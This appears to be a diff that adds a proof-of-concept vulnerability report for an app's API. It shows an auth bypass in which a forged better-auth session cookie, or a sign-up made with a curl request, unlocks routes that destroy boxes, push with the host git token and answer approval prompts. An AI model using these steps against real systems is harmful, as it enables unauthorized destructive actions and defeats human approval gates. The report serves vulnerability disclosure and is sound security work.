@@ -1,0 +1,25 @@
+
+== 1. Baseline: an anonymous request with NO session cookie ==
+   POST /api/v1/boxes/some-box/destroy             -> 401
+   POST /api/v1/boxes/some-box/git/push            -> 401
+   POST /api/v1/approvals/pending-id/answer        -> 401
+
+== 2. Attack (A): a FORGED cookie with an arbitrary value ==
+   better-auth getSessionCookie does no validation, so any value is "a session":
+     getSessionCookie({cookie: 'better-auth.session_token=x'}) = "x"
+   POST /api/v1/boxes/some-box/destroy             -> ALLOW
+   POST /api/v1/boxes/some-box/git/push            -> ALLOW
+   POST /api/v1/approvals/pending-id/answer        -> ALLOW
+
+== 3. Attack (B): open self-registration (no forgery needed) ==
+   auth.ts:47  emailAndPassword: { enabled: true }   // no disableSignUp / requireEmailVerification
+   The /api/auth/[...all] route exposes POST /api/auth/sign-up/email whenever authMode()==="password",
+   and the middleware matcher (proxy.ts:102) EXCLUDES /api/auth, so sign-up itself is ungated:
+     curl -X POST http://HUB:8787/api/auth/sign-up/email -d '{"email":"a@a.co","password":"Password123!","name":"a"}'
+     -> 200 Set-Cookie: better-auth.session_token=<valid>   (a real session, satisfies the same gate)
+
+== 4. Result ==
+VULNERABLE -- all 3/3 privileged routes accept a forged cookie with no account.
+   An unauthenticated network client can destroy boxes, push the box branch with the host git
+   token, and answer approval prompts "y" -- defeating the host-action approval gate.
+   Additionally, logout/expiry/DB-revocation never take effect: no handler re-checks the session.
